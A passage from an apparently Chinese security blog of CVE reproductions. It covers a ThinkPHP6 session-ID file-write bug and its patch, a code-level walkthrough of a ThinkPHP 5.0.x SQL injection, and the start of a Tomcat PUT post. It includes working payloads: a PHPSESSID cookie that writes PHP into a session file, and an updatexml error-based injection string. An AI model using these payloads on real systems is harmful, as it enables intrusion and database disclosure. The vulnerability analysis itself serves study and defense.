&amp;&amp; <span class="variable">$request</span>-&gt;request(<span class="variable">$varSessionId</span>)) &#123;</span><br><span class="line">           <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;request(<span class="variable">$varSessionId</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;cookie(<span class="variable">$cookieName</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$sessionId</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;session-&gt;setId(<span class="variable">$sessionId</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
<p>因此构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</span><br></pre></td></tr></table></figure>



<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span>(<span class="params"><span class="variable">$id</span>=<span class="literal">null</span></span>):<span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === <span class="number">32</span> &amp;&amp; ctype_alnum(<span class="variable">$id</span>) ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cku8j3fgt002kdan72lc4fkft" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
<p><code>application/index/controller/index.php</code>内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">model</span>\<span class="title">Gather</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ids</span> = input(<span class="string">&#x27;ids/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$t</span> = db(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$t</span>-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="variable">$ids</span>)-&gt;select();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
<p>调用堆栈为:</p>
<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
<p>从index()方法开始</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ids</span> = input(<span class="string">&#x27;ids/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$t</span> = db(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$t</span>-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="variable">$ids</span>)-&gt;select();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$data</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	...</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分析查询表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;parseExpress();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$resultSet</span>) &#123;</span><br><span class="line">            <span class="comment">// 生成查询SQL</span></span><br><span class="line">            <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;builder-&gt;select(<span class="variable">$options</span>);</span><br><span class="line">            <span class="comment">// 获取参数绑定</span></span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseExpress</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;options;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
<p>获得<code>$option</code>的调用链为:</p>
<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null) </code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
<p>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = str_replace(</span><br><span class="line">            [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="variable">$options</span>[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(<span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(<span class="variable">$options</span>[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(<span class="variable">$options</span>[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(<span class="variable">$options</span>[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(<span class="variable">$options</span>[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">            ], <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span>(<span class="params"><span class="variable">$where</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whereStr</span> = <span class="keyword">$this</span>-&gt;buildWhere(<span class="variable">$where</span>, <span class="variable">$options</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable">$whereStr</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; WHERE &#x27;</span> . <span class="variable">$whereStr</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildWhere</span>(<span class="params"><span class="variable">$where</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$where</span>)) &#123;</span><br><span class="line">            <span class="variable">$where</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$where</span> <span class="keyword">instanceof</span> Query) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;buildWhere(<span class="variable">$where</span>-&gt;getOptions(<span class="string">&#x27;where&#x27;</span>), <span class="variable">$options</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$whereStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$binds</span>    = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$str</span> = [];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$field</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                ...</span><br><span class="line">                    <span class="comment">// 对字段使用表达式查询</span></span><br><span class="line">                    <span class="variable">$field</span> = is_string(<span class="variable">$field</span>) ? <span class="variable">$field</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="variable">$str</span>[] = <span class="string">&#x27; &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;parseWhereItem(<span class="variable">$field</span>, <span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$options</span>, <span class="variable">$binds</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="keyword">empty</span>(<span class="variable">$whereStr</span>) ? substr(implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>), strlen(<span class="variable">$key</span>) + <span class="number">1</span>) : implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code> $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhereItem</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$val</span>, <span class="variable">$rule</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$options</span> = [], <span class="variable">$binds</span> = [], <span class="variable">$bindName</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="variable">$key</span> = <span class="variable">$field</span> ? <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$field</span>, <span class="variable">$options</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询规则和条件</span></span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="variable">$val</span> = [<span class="string">&#x27;=&#x27;</span>, <span class="variable">$val</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$exp</span>, <span class="variable">$value</span>) = <span class="variable">$val</span>;</span><br><span class="line">        <span class="comment">// 字段分析</span></span><br><span class="line">        <span class="keyword">if</span>(....)&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (in_array(<span class="variable">$exp</span>, [<span class="string">&#x27;NOT IN&#x27;</span>, <span class="string">&#x27;IN&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// IN 查询</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$value</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$exp</span> . <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;parseClosure(<span class="variable">$value</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$value</span> = is_array(<span class="variable">$value</span>) ? <span class="variable">$value</span> : explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span> (array_key_exists(<span class="variable">$field</span>, <span class="variable">$binds</span>)) &#123;</span><br><span class="line">                    <span class="variable">$bind</span>  = [];</span><br><span class="line">                    <span class="variable">$array</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query-&gt;isBind(<span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . uniqid() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$bind</span>[<span class="variable">$bindKey</span>] = [<span class="variable">$v</span>, <span class="variable">$bindType</span>];</span><br><span class="line">                        <span class="variable">$array</span>[]        = <span class="string">&#x27;:&#x27;</span> . <span class="variable">$bindKey</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;query-&gt;bind(<span class="variable">$bind</span>);</span><br><span class="line">                    <span class="variable">$zone</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$array</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$zone</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$value</span>, <span class="variable">$field</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$exp</span> . <span class="string">&#x27; (&#x27;</span> . (<span class="keyword">empty</span>(<span class="variable">$zone</span>) ? <span class="string">&quot;&#x27;&#x27;&quot;</span> : <span class="variable">$zone</span>) . <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query-&gt;isBind(<span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>)) &#123;</span><br><span class="line">                        <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . uniqid() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$bind</span>[<span class="variable">$bindKey</span>] = [<span class="variable">$v</span>, <span class="variable">$bindType</span>];</span><br><span class="line">                    <span class="variable">$array</span>[]        = <span class="string">&#x27;:&#x27;</span> . <span class="variable">$bindKey</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
<p>但是这里只能进行没有子查询语句的sql报错注入</p>
<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="cku8j3fgv002pdan7gl662bsv" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
